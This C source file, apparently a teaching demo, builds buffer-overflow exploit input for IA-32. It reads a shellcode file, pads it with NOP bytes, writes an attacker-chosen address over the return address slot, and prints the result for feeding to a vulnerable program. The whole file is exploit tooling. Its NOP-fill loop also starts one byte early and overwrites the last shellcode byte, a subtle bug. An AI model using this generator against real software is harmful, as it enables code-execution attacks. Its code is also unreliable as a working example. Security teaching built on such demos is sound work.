/*
 * BOFDemo: A simple buffer overflow vulnerability demo for IA-32
 */

#include <stdio.h>
#include <stdlib.h>

void usage(char *name) {
    fprintf(stderr, "usage: %s sc_file ret_off sc_addr\n", name);
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[]) {
    char *this = argv[0];
    if (argc != 4) usage(this);
    char *sc_file = argv[1]; 
    int ret_off = strtol(argv[2], NULL, 10);
    unsigned int sc_addr = strtoll(argv[3], NULL, 16);

    int blen = (ret_off + 1) * 4;
    unsigned char *buf = malloc(sizeof(unsigned char) * blen);
    if (buf == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    FILE *fp = fopen(sc_file, "r");
    if (fp == NULL) {
        perror(sc_file);
        exit(EXIT_FAILURE);
    }
    fseek(fp, 0L, SEEK_END);
    if (blen - 8 < ftell(fp)) {
        fprintf(stderr, "%s: too big to fit the buffer\n", sc_file);
        fclose(fp);
        exit(EXIT_FAILURE);
    }
    fseek(fp, 0L, SEEK_SET);
    int c, k = 0;
    while ((c = getc(fp)) != EOF && k < blen)
        buf[k++] = c;
    fclose(fp);
    for (int i = k - 1; i < blen; i++)
        buf[i] = 0x90;

    unsigned int *bp = (unsigned int *)buf + ret_off;
    *bp = sc_addr;
    
    for (int i = 0; i < blen; i++)
        putchar(buf[i]);
    free(buf);

    return EXIT_SUCCESS;
}

